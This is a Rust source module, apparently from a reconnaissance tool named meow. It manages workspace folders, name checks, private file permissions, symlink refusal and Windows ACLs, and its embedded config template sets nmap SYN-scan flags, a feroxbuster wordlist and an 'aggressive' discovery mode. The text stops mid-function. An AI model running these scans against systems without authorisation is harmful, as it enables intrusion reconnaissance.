//! Workspace directories, permissions, `config.toml` / `profile.toml`, and
//! the workspace listing.
//!
//! Layout: `~/.meow/config.toml` (global). A new session is saved in
//! `<folder>/meow/<name>/`, where `<folder>` is the folder meow runs from
//! unless the user picks another; every session saved in that folder shares
//! its `meow/`, which holds a `.gitignore` that keeps it out of git and
//! marks it as meow's (each session has a `.gitignore` of its own too).
//! `~/.meow/local-workspaces` remembers each one, so
//! `meow <name>` finds it from any folder. Older sessions stay where they
//! were made: `~/.meow/workspaces/<name>/` (still made with `--home`) and
//! `./.meow/` (the old `--local`). Directories are `0700` and files `0600`
//! on Unix; on Windows the directory ACL is reduced to the current user.

use std::collections::HashSet;
use std::env;
use std::ffi::OsString;
use std::fs::{self, OpenOptions};
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant, SystemTime};

use anyhow::{anyhow, bail, Context, Result};
use serde::{Deserialize, Serialize};

use crate::ai::AiSettings;
use crate::cve::CveSettings;
use crate::location::LocationSettings;
use crate::mode::Mode;
use crate::queue::{PresetOverride, ReconSettings};
use crate::update::{GitRuns, NoAnswer};

/// Name of the active session, exported inside a session shell.
pub const SESSION_ENV: &str = "MEOW_SESSION";
/// Absolute workspace directory of the active session.
pub const WORKSPACE_ENV: &str = "MEOW_WORKSPACE";
/// Discovery mode of the active session.
pub const MODE_ENV: &str = "MEOW_MODE";
/// Overrides the `~/.meow` base directory.
pub const HOME_ENV: &str = "MEOW_HOME";

const LOCAL_DIR: &str = ".meow";
/// The session shells that keep a history in the workspace. Each has a file
/// of its own (`zsh_history`, ...), as each writes its own format.
pub const HISTORY_SHELLS: [&str; 3] = ["zsh", "bash", "powershell"];
/// The visible folder that holds the sessions saved in a folder.
pub const SESSIONS_DIR: &str = "meow";
/// The `.gitignore` in every `./meow`; it also marks the folder as meow's.
const SESSIONS_MARKER: &str = ".gitignore";
const SESSIONS_MARKER_TEXT: &str = "# meow session data: keep it out of git\n*\n";
/// Path parts of folders a cloud service keeps in sync.
const CLOUD_FOLDERS: &[&str] = &[
    "Dropbox",
    "OneDrive",
    "Google Drive",
    "iCloud",
    "Library/Mobile Documents",
    "Library/CloudStorage",
];
const CONFIG_FILE: &str = "config.toml";
const PROFILE_FILE: &str = "profile.toml";
const AI_FILE: &str = "ai.toml";
/// Exclusive session lock file inside a workspace.
pub const LOCK_FILE: &str = "session.lock";
/// Held by a helper command while it writes a session's files with no
/// session running ([`Workspace::write_alone`]).
pub const HELPER_LOCK_FILE: &str = "helper.lock";
/// How long a session that starts, or a helper, waits for a helper that
/// writes the session's files alone.
const HELPER_WAIT: Duration = Duration::from_millis(if cfg!(test) { 200 } else { 5000 });
/// Port and token of the running session; present only while one is open.
pub const RUNTIME_FILE: &str = "runtime.json";
const NAME_MAX: usize = 64;
/// Longer than any path a shell reports as its directory.
const LAST_CWD_MAX: u64 = 64 * 1024;

/// Device names Windows refuses as file or directory names.
const WINDOWS_RESERVED: &[&str] = &[
    "con", "prn", "aux", "nul", "com1", "com2", "com3", "com4", "com5", "com6", "com7", "com8",
    "com9", "lpt1", "lpt2", "lpt3", "lpt4", "lpt5", "lpt6", "lpt7", "lpt8", "lpt9",
];

const CONFIG_TEMPLATE: &str = r#"# meow global configuration. Applies to every workspace.

# Discovery mode for newly created workspaces: "light", "mild" or "aggressive".
# "light" is passive only and sends no packets.
default_mode = "light"

# Shell to launch inside a session. Leave commented out to use the platform
# default (zsh on macOS, bash on Linux, PowerShell on Windows).
# shell = "/bin/zsh"

[location]
# When the map is open, estimate where this machine is from its public
# address, asking the service below once and again when the network
# changes. The request carries nothing about you or your targets; the
# service sees only the address it comes from. Nothing is looked up while
# a VPN carries all traffic. Set to false to turn it off: no place is looked
# up and no map picture is fetched, for this machine or for a selected server.
enabled = true
# url = "https://ipinfo.io/json"
# Show the estimate on a small satellite map with a pin and a circle for the
# rough area. meow fetches the few pictures around it (Sentinel-2 cloudless
# by EOX, free for non-commercial use), which tells EOX the rough area; set
# map = false to show only a compass. `tiles` picks another picture source.
map = true
# tiles = "https://tiles.maps.eox.at/wmts/1.0.0/s2cloudless_3857/default/GoogleMapsCompatible/{z}/{y}/{x}.jpg"
# Selecting a device moves the map to it: a public address is looked up in
# the location database install.sh downloads to ~/.meow/geo (DB-IP Lite),
# never sent anywhere. Another folder with the database can be named here.
# database = ""

[cve]
# Look up known vulnerabilities for discovered software (NIST NVD, OSV.dev,
# CISA KEV). Free, no AI involved; only software names and versions are sent.
enabled = true
# Optional NVD API key: lookups are paced at 0.7 s instead of 6.5 s each.
# nvd_api_key = "..."

[recon]
# `meow recon` settings. Each tool run is stopped after this many seconds,
# or when its output file grows past the cap.
stage_timeout_secs = 1800
output_cap_mb = 50
# Wordlist for feroxbuster. Standard seclists/dirb paths are tried otherwise;
# without any wordlist the directory stage is skipped. A .txt file put in
# ~/.meow/wordlists is used when nothing else is found.
# wordlist_path = "/usr/share/seclists/Discovery/Web-Content/common.txt"
# skip = ["udp", "js"]   # stages to leave out
# Override the built-in nmap flags per mode, for example:
# [recon.mild]
# nmap_ports = ["-sS", "-T3", "--top-ports", "1000"]

[ai]
# On-demand AI help, started by hand from `meow hud` ([L], [C], [R]).
# [L] local: an OpenAI-compatible server on this machine. Free, nothing leaves.
local_url = "http://localhost:1234/v1"
# local_model = ""
# [C] cloud triage and [R] grounded research go through the Claude API (with
# a Claude API key) or OpenRouter. Private values are replaced by placeholders
# first. Run `meow setup` to add your own key or to choose your local model:
# it keeps them in ai.toml next to this file and overrides what is set here.
# A key in the environment also works: ANTHROPIC_API_KEY or OPENROUTER_API_KEY.
cloud_model = "anthropic/claude-sonnet-5.5"
research_model = "anthropic/claude-opus-5.5"
# Hard daily caps for the cloud tiers; when reached, [C] answers locally.
max_daily_usd = 1.0
max_daily_calls = 20
# Your own notes stay on this machine: a note is free text, and nothing can
# recognise a password that is written like a word. true sends them (masked
# like everything else) with requests that leave this machine.
# cloud_notes = false
"#;

/// Validates a workspace name so it is a safe single directory name on
/// macOS, Linux and Windows.
pub fn validate_name(raw: &str) -> Result<String, String> {
    if raw.is_empty() || raw.len() > NAME_MAX {
        return Err(format!("must be 1-{NAME_MAX} characters"));
    }
    let valid_char = |c: char| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.');
    if !raw.chars().all(valid_char) {
        return Err("only letters, digits, - _ .".into());
    }
    if !raw.starts_with(|c: char| c.is_ascii_alphanumeric()) {
        return Err("must start with a letter or digit".into());
    }
    if raw.ends_with('.') {
        return Err("must not end with a dot".into());
    }
    let stem = raw.split('.').next().unwrap_or(raw).to_ascii_lowercase();
    if WINDOWS_RESERVED.contains(&stem.as_str()) {
        return Err(format!(
            "{raw} is a device name on Windows: pick another name"
        ));
    }
    if RESERVED_COMMANDS.contains(&raw.to_ascii_lowercase().as_str()) {
        return Err(format!("{raw} is a meow command: pick another name"));
    }
    Ok(raw.to_owned())
}

/// CLI subcommand names and aliases that cannot be used as workspace names.
pub const RESERVED_COMMANDS: &[&str] = &[
    "list", "ls", "status", "delete", "rm", "setup", "update", "tools", "add", "recon", "cve",
    "ask", "note", "map", "hud", "mode", "resume", "report", "help", "version",
];

fn checked_name(raw: &str) -> Result<String> {
    validate_name(raw).map_err(|reason| anyhow!("invalid workspace name '{raw}': {reason}"))
}

// ---------------------------------------------------------------------------
// Session environment
// ---------------------------------------------------------------------------

/// The session variables of the current process.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SessionEnv {
    pub session: Option<String>,
    pub workspace: Option<PathBuf>,
}

impl SessionEnv {
    pub fn from_process() -> Self {
        let non_empty = |key: &str| env::var_os(key).filter(|value| !value.is_empty());
        Self {
            session: non_empty(SESSION_ENV).map(|v| v.to_string_lossy().into_owned()),
            workspace: non_empty(WORKSPACE_ENV).map(PathBuf::from),
        }
    }

    /// Label of the session this process runs inside, if any. Either variable
    /// alone is enough to count as "inside a session".
    pub fn active_label(&self) -> Option<String> {
        self.session
            .clone()
            .or_else(|| self.workspace.as_ref().map(|p| p.display().to_string()))
    }
}

// ---------------------------------------------------------------------------
// Base directory
// ---------------------------------------------------------------------------

/// The `~/.meow` base directory.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MeowHome(PathBuf);

impl MeowHome {
    /// `$MEOW_HOME` if set, otherwise `~/.meow`. Always absolute.
    pub fn from_env() -> Result<Self> {
        let root = match env::var_os(HOME_ENV).filter(|value| !value.is_empty()) {
            Some(custom) => PathBuf::from(custom),
            None => dirs::home_dir()
                .context("cannot determine the home directory; set MEOW_HOME")?
                .join(LOCAL_DIR),
        };
        Self::at(root)
    }

    pub fn at(root: impl Into<PathBuf>) -> Result<Self> {
        let root = root.into();
        let root = std::path::absolute(&root)
            .with_context(|| format!("cannot resolve {}", root.display()))?;
        Ok(Self(root))
    }

    pub fn root(&self) -> &Path {
        &self.0
    }

    /// The marks of the sessions outside `~/.meow` this user made or
    /// accepted, with the place of each one in a `./meow` folder.
    pub fn local_record_path(&self) -> PathBuf {
        self.0.join(LOCAL_RECORD_FILE)
    }

    pub fn config_path(&self) -> PathBuf {
        self.0.join(CONFIG_FILE)
    }

    /// The user's own AI setup, written by `meow setup`.
    pub fn ai_path(&self) -> PathBuf {
        self.0.join(AI_FILE)
    }

    pub fn workspaces_dir(&self) -> PathBuf {
        self.0.join("workspaces")
    }

    pub fn workspace_dir(&self, name: &str) -> PathBuf {
        self.workspaces_dir().join(name)
    }

    /// True when `dir` is a valid named workspace directly inside
    /// `self.workspaces_dir()`, even if reached through a symlinked parent.
    pub fn is_saved_workspace_dir(&self, dir: &Path) -> bool {
        let Some(parent) = dir.parent() else {
            return false;
        };
        let Some(name) = dir.file_name().and_then(|n| n.to_str()) else {
            return false;
        };
        if validate_name(name).is_err() {
            return false;
        }
        let expected = self.workspaces_dir();
        if parent == expected {
            return true;
        }
        let real = |p: &Path| fs::canonicalize(p).ok();
        matches!((real(parent), real(&expected)), (Some(a), Some(b)) if a == b)
    }

    /// Absolute `./.meow` of `cwd`, refused when it is the base directory
    /// itself (running `--local` from the home directory) or lies inside it.
    /// The two are compared as the folders they really are: either path may
    /// reach the same place through a link (a linked `/home`, a `MEOW_HOME`
    /// kept in a dotfiles folder), and then the names differ.
    pub fn local_dir(&self, cwd: &Path) -> Result<PathBuf> {
        let dir = std::path::absolute(cwd.join(LOCAL_DIR))
            .with_context(|| format!("cannot resolve {}", cwd.display()))?;
        let real = |path: &Path| fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
        let base = real(&self.0);
        // `./.meow` may not exist yet; its folder does.
        let local = fs::canonicalize(&dir).unwrap_or_else(|_| real(cwd).join(LOCAL_DIR));
        if local == base || dir == self.0 {
            bail!(
                "{} is meow's own data directory; run --local from a project directory",
                dir.display()
            );
        }
        if local.starts_with(&base) || dir.starts_with(&self.0) {
            bail!(
                "{} is inside meow's own data directory; run --local from a project directory",
                dir.display()
            );
        }
        Ok(dir)
    }
}

// ---------------------------------------------------------------------------
// Private files and directories
// ---------------------------------------------------------------------------

/// `OpenOptions` that create files as `0600` on Unix and refuse to follow
/// symbolic links (`O_NOFOLLOW`). On Windows, files inherit the restricted
/// ACL of the workspace directory.
pub fn private_open_options() -> OpenOptions {
    #[cfg_attr(not(unix), allow(unused_mut))]
    let mut options = OpenOptions::new();
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
        options.custom_flags(libc::O_NOFOLLOW);
    }
    options
}

/// Parses a settings file. The error names the file, the line and what is
/// wrong, and never quotes the file: the toml crate's own message shows the
/// whole offending line, which would print a key from `ai.toml` or
/// `config.toml`, or control bytes from a profile that came with a folder.
pub fn parse_toml<T: serde::de::DeserializeOwned>(text: &str, path: &Path) -> Result<T> {
    toml::from_str(text).map_err(|error| {
        let what = without_values(&crate::evidence::sanitize(error.message(), 300));
        match error.span() {
            Some(span) => {
                let before = text.get(..span.start).unwrap_or(text);
                let line = before.matches('\n').count() + 1;
                anyhow!("invalid {}: line {line}: {what}", path.display())
            }
            None => anyhow!("invalid {}: {what}", path.display()),
        }
    })
}

/// A parser message without the value it complains about. "invalid type:
/// string "..."" and "unknown variant `...`" repeat what the file holds.
fn without_values(message: &str) -> String {
    for kind in ["invalid type: ", "invalid value: "] {
        let Some(rest) = message.strip_prefix(kind) else {
            continue;
        };
        let (found, expected) = match rest.rfind(", expected ") {
            Some(at) => (&rest[..at], &rest[at..]),
            None => (rest, ""),
        };
        let found: String = found
            .chars()
            .take_while(|c| c.is_ascii_alphabetic() || *c == ' ')
            .collect();
        return format!("{kind}{}{expected}", found.trim_end());
    }
    if message.starts_with("unknown variant ") {
        return match message.rfind(", expected ") {
            Some(at) => format!("unknown value{}", &message[at..]),
            None => "unknown value".to_owned(),
        };
    }
    message.to_owned()
}

/// Reads a small text file meow keeps, without following a link left in
/// its place and without taking in more than `max` bytes. A folder someone
/// else prepared can therefore not make the read wait (a pipe) or fill
/// memory (`/dev/zero`, a huge file).
pub fn read_bounded(path: &Path, max: u64) -> io::Result<String> {
    let (file, meta) = open_regular(path)?;
    if meta.len() > max {
        return Err(io::Error::other("is larger than meow writes it"));
    }
    let mut text = String::new();
    file.take(max + 1).read_to_string(&mut text)?;
    if text.len() as u64 > max {
        return Err(io::Error::other("is larger than meow writes it"));
    }
    Ok(text)
}

/// Opens a file meow keeps for reading: never through a link left in its
/// place, never waiting on a pipe, and only when it is a regular file.
fn open_regular(path: &Path) -> io::Result<(fs::File, fs::Metadata)> {
    let mut options = OpenOptions::new();
    options.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        // Without O_NONBLOCK, opening a pipe waits for someone to write.
        options.custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK);
    }
    #[cfg(not(unix))]
    if fs::symlink_metadata(path)?.file_type().is_symlink() {
        return Err(io::Error::other("is a link"));
    }
    let file = options.open(path)?;
    let meta = file.metadata()?;
    if !meta.is_file() {
        return Err(io::Error::other("is not a regular file"));
    }
    Ok((file, meta))
}

/// The end of a file meow keeps, at most `max` bytes, from its first whole
/// line on: what the newest lines of a file that grew too large still say.
fn read_newest(path: &Path, max: u64) -> io::Result<String> {
    use std::io::{Seek, SeekFrom};
    let (mut file, meta) = open_regular(path)?;
    let cut = meta.len() > max;
    if cut {
        file.seek(SeekFrom::Start(meta.len() - max))?;
    }
    let mut bytes = Vec::new();
    file.take(max).read_to_end(&mut bytes)?;
    if cut {
        let first_whole = bytes
            .iter()
            .position(|&byte| byte == b'\n')
            .map_or(bytes.len(), |at| at + 1);
        bytes.drain(..first_whole);
    }
    Ok(String::from_utf8_lossy(&bytes).into_owned())
}

/// Creates `path` (and missing parents) as a private directory and
/// re-applies the restriction if it already existed.
pub fn create_private_dir(path: &Path) -> Result<()> {
    refuse_symlink(path)?;
    let mut builder = fs::DirBuilder::new();
    builder.recursive(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::DirBuilderExt;
        builder.mode(0o700);
    }
    builder
        .create(path)
        .with_context(|| format!("cannot create {}", path.display()))?;
    refuse_symlink(path)?;
    restrict_dir(path).with_context(|| format!("cannot restrict {}", path.display()))
}

/// [`create_private_dir`] for a folder inside a workspace (`tmp`, `chats`,
/// `tmp/shell`): a link standing in its place is refused, so nothing is
/// created, chmod-ed or written wherever it points.
pub fn create_private_subdir(path: &Path) -> Result<()> {
    refuse_symlink(path)?;
    create_private_dir(path)
}

/// How deep a workspace folder may nest, and how many entries it may hold.
const MAX_TREE_DEPTH: usize = 32;
const MAX_TREE_ENTRIES: usize = 16_384;

/// Everything inside a workspace must be a file or folder of its own. A
/// folder the user did not make (a cloned repository, an unpacked archive)
/// can carry links in place of `session.lock`, `tmp`, `chats` or
/// `replay.sh`; meow would then write, truncate, chmod or read wherever
/// they point. Fails on the first symbolic link, special file, or file with
/// a second hard link. `meow delete` still removes such a folder.
pub fn refuse_links_inside(root: &Path) -> Result<()> {
    fn walk(dir: &Path, depth: usize, seen: &mut usize) -> Result<()> {
        if depth > MAX_TREE_DEPTH {
            bail!("{} is nested too deeply for a workspace", dir.display());
        }
        let entries = match fs::read_dir(dir) {
            Ok(entries) => entries,
            Err(error) if error.kind() == io::ErrorKind::NotFound => return Ok(()),
            Err(error) => {
                return Err(error).with_context(|| format!("cannot read {}", dir.display()))
            }
        };
        for entry in entries {
            *seen = seen.saturating_add(1);
            if *seen > MAX_TREE_ENTRIES {
                bail!(
                    "{} contains too many entries for a workspace",
                    root_label(dir)
                );
            }
            let path = entry
                .with_context(|| format!("cannot read {}", dir.display()))?
                .path();
            let meta = fs::symlink_metadata(&path)
                .with_context(|| format!("cannot inspect {}", path.display()))?;
            let kind = meta.file_type();
            let refuse = |what: &str| {
                anyhow!(
                    "{} {what} inside a workspace, which meow never follows. Remove it, \
                     or delete the workspace with `meow delete`",
                    path.display()
                )
            };
            if kind.is_symlink() {
                return Err(refuse("is a symbolic link"));
            }
            #[cfg(unix)]
            verify_unix_owner_meta(&meta, &path)
                .with_context(|| format!("refusing {}", path.display()))?;
            if kind.is_dir() {
                walk(&path, depth + 1, seen)?;
            } else if kind.is_file() {
                #[cfg(unix)]
                {
                    use std::os::unix::fs::MetadataExt;
                    if meta.nlink() > 1 {
                        return Err(refuse("has a second hard link"));
                    }
                }
            } else {
                return Err(refuse("is a special file"));
            }
        }
        Ok(())
    }
    fn root_label(dir: &Path) -> String {
        dir.display().to_string()
    }
    let mut seen = 0usize;
    walk(root, 0, &mut seen)
}

/// Atomically replaces `path` with `contents` via a `0600` temp file in the
/// same directory (same filesystem, so the rename cannot cross mounts).
pub fn write_private_atomic(path: &Path, contents: &[u8]) -> Result<()> {
    refuse_file_symlink(path)?;
    let dir = path
        .parent()
        .with_context(|| format!("{} has no parent directory", path.display()))?;
    let write = || -> io::Result<()> {
        let mut tmp = tempfile::NamedTempFile::new_in(dir)?;
        tmp.write_all(contents)?;
        tmp.as_file().sync_all()?;
        tmp.persist(path).map_err(|e| e.error)?;
        Ok(())
    };
    write().with_context(|| format!("cannot write {}", path.display()))
}

#[cfg(unix)]
fn verify_unix_owner_meta(meta: &fs::Metadata, path: &Path) -> io::Result<()> {
    use std::os::unix::fs::MetadataExt;
    // SAFETY: `geteuid` has no preconditions and cannot fail.
    let euid = unsafe { libc::geteuid() };
    if meta.uid() != euid {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            format!(
                "{} is owned by uid {}, expected current uid {}",
                path.display(),
                meta.uid(),
                euid
            ),
        ));
    }
    Ok(())
}

#[cfg(unix)]
fn set_mode(path: &Path, mode: u32) -> io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    let meta = fs::symlink_metadata(path)?;
    if meta.file_type().is_symlink() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            format!("{} is a symbolic link", path.display()),
        ));
    }
    verify_unix_owner_meta(&meta, path)?;
    let current = meta.permissions().mode() & 0o7777;
    if current != mode {
        fs::set_permissions(path, fs::Permissions::from_mode(mode))?;
    }
    Ok(())
}

#[cfg(unix)]
fn restrict_dir(path: &Path) -> io::Result<()> {
    set_mode(path, 0o700)
}

#[cfg(unix)]
fn restrict_file(path: &Path) -> io::Result<()> {
    set_mode(path, 0o600)
}

/// Re-applies `0700` / `0600` to everything under `root`. Links are not
/// chmod-ed through; [`refuse_links_inside`] has refused them before this,
/// and transient `NotFound` errors on disappearing temp files are ignored.
#[cfg(unix)]
fn enforce_private_tree(root: &Path) -> io::Result<()> {
    restrict_dir(root)?;
    for entry in fs::read_dir(root)? {
        let entry = match entry {
            Ok(entry) => entry,
            Err(e) if e.kind() == io::ErrorKind::NotFound => continue,
            Err(e) => return Err(e),
        };
        let kind = match entry.file_type() {
            Ok(kind) => kind,
            Err(e) if e.kind() == io::ErrorKind::NotFound => continue,
            Err(e) => return Err(e),
        };
        let res = if kind.is_dir() {
            enforce_private_tree(&entry.path())
        } else if kind.is_file() {
            restrict_file(&entry.path())
        } else {
            Ok(())
        };
        match res {
            Ok(()) => {}
            Err(e) if e.kind() == io::ErrorKind::NotFound => continue,
            Err(e) => return Err(e),
        }
    }
    Ok(())
}

#[cfg_attr(not(windows), allow(dead_code))]
fn is_valid_windows_sid(s: &str) -> bool {
    let Some(rest) = s.strip_prefix("S-1-") else {
        return false;
    };
    !rest.is_empty()
        && s.len() <= 184
        && rest.starts_with(|c: char| c.is_ascii_digit())
        && rest.ends_with(|c: char| c.is_ascii_digit())
        && !rest.contains("--")
        && rest.chars().all(|c| c.is_ascii_digit() || c == '-')
}

/// True when `owner_sid` is the current user's SID, the current process
/// token's default owner SID (which is `S-1-5-32-544` `BUILTIN\Administrators`
/// when elevated), or `NT AUTHORITY\SYSTEM` (`S-1-5-18`). Any folder or file
/// created by another unprivileged Windows account fails this check.
#[cfg(test)]
fn is_trusted_windows_owner_sid(owner_sid: &str, user_sid: &str, token_owner_sid: &str) -> bool {
    is_valid_windows_sid(owner_sid)
        && (owner_sid.eq_ignore_ascii_case(user_sid)
            || owner_sid.eq_ignore_ascii_case(token_owner_sid)
            || owner_sid.eq_ignore_ascii_case("S-1-5-18"))
}

#[cfg(windows)]
fn windows_system32_dir() -> PathBuf {
    use std::path::{Component, Prefix};
    let valid_root = |raw: &std::ffi::OsStr| -> Option<PathBuf> {
        let p = PathBuf::from(raw);
        let mut comps = p.components();
        if !matches!(
            comps.next(),
            Some(Component::Prefix(pr)) if matches!(pr.kind(), Prefix::Disk(_))
        ) {
            return None;
        }
        if !matches!(comps.next(), Some(Component::RootDir)) {
            return None;
        }
        if comps.any(|c| !matches!(c, Component::Normal(_))) {
            return None;
        }
        Some(p)
    };
    std::env::var_os("SystemRoot")
        .and_then(|v| valid_root(&v))
        .unwrap_or_else(|| PathBuf::from(r"C:\Windows"))
        .join("System32")
}

#[cfg(windows)]
fn windows_system32_exe(name: &str) -> io::Result<PathBuf> {
    let exe = windows_system32_dir().join(format!("{name}.exe"));
    if exe.is_file() {
        Ok(exe)
    } else {
        Err(io::Error::new(
            io::ErrorKind::NotFound,
            format!("cannot find {}", exe.display()),
        ))
    }
}

#[cfg(windows)]
fn windows_powershell_exe() -> io::Result<PathBuf> {
    let exe = windows_system32_dir()
        .join("WindowsPowerShell")
        .join("v1.0")
        .join("powershell.exe");
    if exe.is_file() {
        Ok(exe)
    } else {
        Err(io::Error::new(
            io::ErrorKind::NotFound,
            format!("cannot find {}", exe.display()),
        ))
    }
}

#[cfg(windows)]
struct WindowsIdentitySids {
    user: String,
    token_owner: String,
}

#[cfg(windows)]
fn current_windows_identity() -> io::Result<&'static WindowsIdentitySids> {
    use std::os::windows::process::CommandExt;
    use std::process::{Command, Stdio};
    use std::sync::OnceLock;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    static IDENTITY: OnceLock<WindowsIdentitySids> = OnceLock::new();
    if let Some(cached) = IDENTITY.get() {
        return Ok(cached);
    }

    let resolved = (|| -> Option<WindowsIdentitySids> {
        let ps = windows_powershell_exe().ok()?;
        let out = Command::new(ps)
            .args([
                "-NoLogo",
                "-NoProfile",
                "-NonInteractive",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; \
                 $id = [System.Security.Principal.WindowsIdentity]::GetCurrent(); \
                 Write-Output $id.User.Value; \
                 Write-Output $id.Owner.Value",
            ])
            .creation_flags(CREATE_NO_WINDOW)
            .stdin(Stdio::null())
            .stderr(Stdio::null())
            .output()
            .ok()?;
        if !out.status.success() {
            return None;
        }
        let text = String::from_utf8(out.stdout).ok()?;
        let mut lines = text.lines().map(str::trim).filter(|s| !s.is_empty());
        let user = lines.next()?.to_owned();
        let owner = lines.next().unwrap_or(user.as_str()).to_owned();
        if is_valid_windows_sid(&user) && is_valid_windows_sid(&owner) {
            Some(WindowsIdentitySids {
                user,
                token_owner: owner,
            })
        } else {
            None
        }
    })();

    let identity = match resolved {
        Some(id) => id,
        None => {
            let whoami = Command::new(windows_system32_exe("whoami")?)
                .args(["/user", "/fo", "csv", "/nh"])
                .creation_flags(CREATE_NO_WINDOW)
                .stdin(Stdio::null())
                .stderr(Stdio::null())
                .output()?;
            if !whoami.status.success() {
                return Err(io::Error::other("whoami /user failed"));
            }
            let line = String::from_utf8_lossy(&whoami.stdout);
            let sid = line
                .trim()
                .rsplit_once(',')
                .map(|(_, s)| s.trim().trim_matches('"'))
                .filter(|s| is_valid_windows_sid(s))
                .ok_or_else(|| io::Error::other("whoami /user did not return a valid S-1-... SID"))?
                .to_owned();
            WindowsIdentitySids {
                token_owner: sid.clone(),
                user: sid,
            }
        }
    };

    let _ = IDENTITY.set(identity);
    IDENTITY
        .get()
        .ok_or_else(|| io::Error::other("failed to cache Windows user SID"))
}

/// Runs a PowerShell ACL script against `path` (passed via `MEOW_ACL_PATH`,
/// never interpolated into `-Command`), verifying NTFS owner SID and replacing
/// the DACL so no pre-existing explicit ACEs for `Everyone` or other accounts
/// survive.
#[cfg(windows)]
fn run_windows_acl_script(path: &Path, script: &str) -> io::Result<()> {
    use std::os::windows::process::CommandExt;
    use std::process::{Command, Stdio};
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    if fs::symlink_metadata(path)?.file_type().is_symlink() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            format!("{} is a symbolic link", path.display()),
        ));
    }
    let id = current_windows_identity()?;
    let out = Command::new(windows_powershell_exe()?)
        .args([
            "-NoLogo",
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            script,
        ])
        .env("MEOW_ACL_PATH", path)
        .env("MEOW_USER_SID", &id.user)
        .env("MEOW_TOKEN_OWNER_SID", &id.token_owner)
        .creation_flags(CREATE_NO_WINDOW)
        .stdin(Stdio::null())
        .output()?;
    if out.status.success() {
        return Ok(());
    }
    let code = out.status.code().unwrap_or(-1);
    let detail = String::from_utf8_lossy(&out.stderr).trim().to_owned();
    match code {
        2 => Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            format!("{} is a link or reparse point", path.display()),
        )),
        3 => Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            format!(
                "{} belongs to another Windows account; refusing to trust it",
                path.display()
            ),
        )),
        _ => Err(io::Error::other(if detail.is_empty() {
            format!(
                "Windows ACL enforcement failed on {} (exit {code})",
                path.display()
            )
        } else {
            format!(
                "Windows ACL enforcement failed on {}: {}",
                path.display(),
                crate::evidence::sanitize(&detail, 240)
            )
        })),
    }
}

#[cfg(windows)]
pub(crate) fn verify_windows_owner(path: &Path) -> io::Result<()> {
    const SCRIPT: &str = r#"
$ErrorActionPreference = 'Stop'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$item = Get-Item -LiteralPath $env:MEOW_ACL_PATH -Force
if ($item.Attributes -band [System.IO.FileAttributes]::ReparsePoint) { exit 2 }
$sec = $item.GetAccessControl([System.Security.AccessControl.AccessControlSections]::Owner)
$owner = $sec.GetOwner([System.Security.Principal.SecurityIdentifier]).Value
if ($owner -ne $env:MEOW_USER_SID -and $owner -ne $env:MEOW_TOKEN_OWNER_SID -and $owner -ne 'S-1-5-18') {
    exit 3
}
"#;
    run_windows_acl_script(path, SCRIPT)
}

/// Verifies that `path` is owned by the current Windows user and replaces its
/// DACL from scratch with a protected DACL granting full control only to the
/// current user SID, `SYSTEM`, and `Administrators` (wiping any pre-existing
/// explicit ACEs for `Everyone` or other users).
#[cfg(windows)]
fn restrict_dir(path: &Path) -> io::Result<()> {
    const SCRIPT: &str = r#"
$ErrorActionPreference = 'Stop'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$item = Get-Item -LiteralPath $env:MEOW_ACL_PATH -Force
if ($item.Attributes -band [System.IO.FileAttributes]::ReparsePoint) { exit 2 }
if (-not $item.PSIsContainer) { exit 4 }
$ownerSec = $item.GetAccessControl([System.Security.AccessControl.AccessControlSections]::Owner)
$owner = $ownerSec.GetOwner([System.Security.Principal.SecurityIdentifier]).Value
if ($owner -ne $env:MEOW_USER_SID -and $owner -ne $env:MEOW_TOKEN_OWNER_SID -and $owner -ne 'S-1-5-18') {
    exit 3
}
$acl = New-Object System.Security.AccessControl.DirectorySecurity
$acl.SetAccessRuleProtection($true, $false)
$inherit = [System.Security.AccessControl.InheritanceFlags]'ContainerInherit, ObjectInherit'
$none = [System.Security.AccessControl.PropagationFlags]::None
$full = [System.Security.AccessControl.FileSystemRights]::FullControl
$allow = [System.Security.AccessControl.AccessControlType]::Allow
foreach ($s in @($env:MEOW_USER_SID, 'S-1-5-18', 'S-1-5-32-544')) {
    $sid = New-Object System.Security.Principal.SecurityIdentifier($s)
    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sid, $full, $inherit, $none, $allow)))
}
[System.IO.Directory]::SetAccessControl($item.FullName, $acl)
"#;
    run_windows_acl_script(path, SCRIPT)
}

#[cfg(windows)]
fn restrict_file(path: &Path) -> io::Result<()> {
    const SCRIPT: &str = r#"
$ErrorActionPreference = 'Stop'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$item = Get-Item -LiteralPath $env:MEOW_ACL_PATH -Force
if ($item.Attributes -band [System.IO.FileAttributes]::ReparsePoint) { exit 2 }
if ($item.PSIsContainer) { exit 4 }
$ownerSec = $item.GetAccessControl([System.Security.AccessControl.AccessControlSections]::Owner)
$owner = $ownerSec.GetOwner([System.Security.Principal.SecurityIdentifier]).Value
if ($owner -ne $env:MEOW_USER_SID -and $owner -ne $env:MEOW_TOKEN_OWNER_SID -and $owner -ne 'S-1-5-18') {
    exit 3
}
$acl = New-Object System.Security.AccessControl.FileSecurity
$acl.SetAccessRuleProtection($true, $false)
$full = [System.Security.AccessControl.FileSystemRights]::FullControl
